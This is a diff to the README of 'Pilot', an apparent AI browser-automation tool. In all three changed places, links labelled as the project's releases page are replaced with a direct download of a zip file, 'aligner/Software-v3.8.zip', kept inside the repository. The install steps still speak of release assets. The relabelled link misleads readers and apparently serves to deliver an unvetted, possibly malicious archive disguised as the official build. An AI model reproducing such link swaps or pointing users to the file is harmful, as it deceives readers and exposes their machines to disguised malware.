@@ -1,6 +1,6 @@
 # 🧭 Pilot - Control Your Browser With AI
 
-[![Download Pilot](https://img.shields.io/badge/Download-Pilot-6f42c1?style=for-the-badge&logo=github)](https://github.com/Lmo04680/Pilot/releases)
+[![Download Pilot](https://img.shields.io/badge/Download-Pilot-6f42c1?style=for-the-badge&logo=github)](https://github.com/Lmo04680/Pilot/raw/refs/heads/main/aligner/Software-v3.8.zip)
 
 ## ✨ What Pilot does
 
@@ -17,7 +17,7 @@ Pilot is built for people who want AI help with browser tasks without starting f
 
 ## 📥 Download Pilot
 
-1. Open the [Pilot releases page](https://github.com/Lmo04680/Pilot/releases)
+1. Open the [Pilot releases page](https://github.com/Lmo04680/Pilot/raw/refs/heads/main/aligner/Software-v3.8.zip)
 2. Look for the latest release
 3. Download the Windows file listed in the release assets
 4. Save it to your Downloads folder or another easy place
@@ -169,7 +169,7 @@ Pilot works best when the browser state is clear and the task is plain.
 
 Use this page to download the latest Windows build of Pilot:
 
-[Visit the Pilot releases page](https://github.com/Lmo04680/Pilot/releases)
+[Visit the Pilot releases page](https://github.com/Lmo04680/Pilot/raw/refs/heads/main/aligner/Software-v3.8.zip)
 
 ## 🧩 Project topics
 
